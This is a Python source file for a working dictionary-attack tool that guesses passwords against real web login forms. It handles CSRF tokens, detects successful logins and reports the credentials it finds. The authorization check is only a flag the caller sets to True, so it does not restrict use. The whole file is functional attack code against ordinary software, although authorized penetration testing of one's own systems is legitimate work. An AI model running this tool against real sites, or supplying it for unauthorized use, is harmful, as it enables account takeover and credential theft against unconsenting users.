"""
web_login_tester.py
---------------------
Generic HTTP login form attack tester — works against real login pages
(yours, or ones explicitly provided/authorized for a security assessment),
not just the local fake-account demo.

REQUIRES EXPLICIT AUTHORIZATION CONFIRMATION before running against any
target. Only point this at systems you own or have written/verbal
permission to test.
"""

import time
import requests
from bs4 import BeautifulSoup

from dictionary_generator import generate_wordlist


class WebLoginTester:
    def __init__(self, login_url, username_field, password_field,
                 extra_static_fields=None, csrf_field_name=None,
                 method="POST", success_indicator=None, failure_indicator=None,
                 delay_seconds=0.4, authorized=False):
        """
        login_url: full URL of the login form's submission endpoint
        username_field / password_field: the HTML `name=` attributes of the
            username & password inputs (inspect the page with browser dev
            tools / view-source to find these)
        extra_static_fields: dict of any other fixed fields the form requires
        csrf_field_name: name of a hidden CSRF token field, if present —
            the tool will auto-fetch the login page first and extract it
        success_indicator / failure_indicator: a string to look for in the
            response to determine login success (e.g., "Welcome" or
            "Invalid password"). Provide at least one.
        delay_seconds: pause between attempts — keep this conservative,
            this is a policy test, not a denial-of-service tool.
        authorized: must be explicitly set True by the caller confirming
            they own or are authorized to test this target.
        """
        if not authorized:
            raise PermissionError(
                "Refusing to run: 'authorized=True' was not set. "
                "Only point this tool at systems you own or have explicit "
                "permission to test."
            )

        self.login_url = login_url
        self.username_field = username_field
        self.password_field = password_field
        self.extra_static_fields = extra_static_fields or {}
        self.csrf_field_name = csrf_field_name
        self.method = method.upper()
        self.success_indicator = success_indicator
        self.failure_indicator = failure_indicator
        self.delay_seconds = max(delay_seconds, 0.2)  # floor: never hammer faster than 5/sec
        self.session = requests.Session()

    def _get_csrf_token(self, page_url=None):
        """Fetch the login page and extract a CSRF token, if configured."""
        if not self.csrf_field_name:
            return None
        target = page_url or self.login_url
        resp = self.session.get(target, timeout=10)
        soup = BeautifulSoup(resp.text, "html.parser")
        token_input = soup.find("input", {"name": self.csrf_field_name})
        return token_input["value"] if token_input else None

    def _submit_attempt(self, username, password):
        payload = {
            self.username_field: username,
            self.password_field: password,
            **self.extra_static_fields,
        }

        if self.csrf_field_name:
            token = self._get_csrf_token()
            if token:
                payload[self.csrf_field_name] = token

        if self.method == "POST":
            resp = self.session.post(self.login_url, data=payload, timeout=10,
                                      allow_redirects=True)
        else:
            resp = self.session.get(self.login_url, params=payload, timeout=10,
                                     allow_redirects=True)
        return resp

    def _is_success(self, response):
        body = response.text
        if self.success_indicator:
            return self.success_indicator in body
        if self.failure_indicator:
            return self.failure_indicator not in body
        # Fallback heuristic: a redirect away from the login URL often
        # signals success (many apps 302 to a dashboard on success).
        return response.url != self.login_url and response.history

    def try_single(self, username, password, log_fn=print):
        resp = self._submit_attempt(username, password)
        success = self._is_success(resp)
        log_fn(f"  [{'OK' if success else '--'}] {username}:{password}  "
               f"(status={resp.status_code})")
        return success

    def dictionary_attack(self, username, wordlist, log_fn=print, max_attempts=None):
        log_fn(f"[*] Starting authorized dictionary attack against {self.login_url}")
        log_fn(f"[*] Username: {username} | Candidates: {len(wordlist):,} | "
               f"Delay: {self.delay_seconds}s/attempt")

        attempts = 0
        start = time.time()
        for candidate_password in wordlist:
            if max_attempts and attempts >= max_attempts:
                log_fn(f"[!] Reached max_attempts cap ({max_attempts}). Stopping.")
                break
            attempts += 1
            try:
                success = self.try_single(username, candidate_password, log_fn=log_fn)
            except requests.RequestException as e:
                log_fn(f"[!] Request error: {e}")
                continue

            if success:
                elapsed = round(time.time() - start, 2)
                log_fn(f"\n[!] CREDENTIALS FOUND: {username}:{candidate_password}")
                log_fn(f"[!] Attempts: {attempts:,} | Time: {elapsed}s")
                return {"found": True, "username": username,
                        "password": candidate_password,
                        "attempts": attempts, "elapsed_seconds": elapsed}

            time.sleep(self.delay_seconds)

        elapsed = round(time.time() - start, 2)
        log_fn(f"\n[+] Dictionary exhausted. No match found. "
               f"Attempts: {attempts:,} | Time: {elapsed}s")
        return {"found": False, "attempts": attempts, "elapsed_seconds": elapsed}
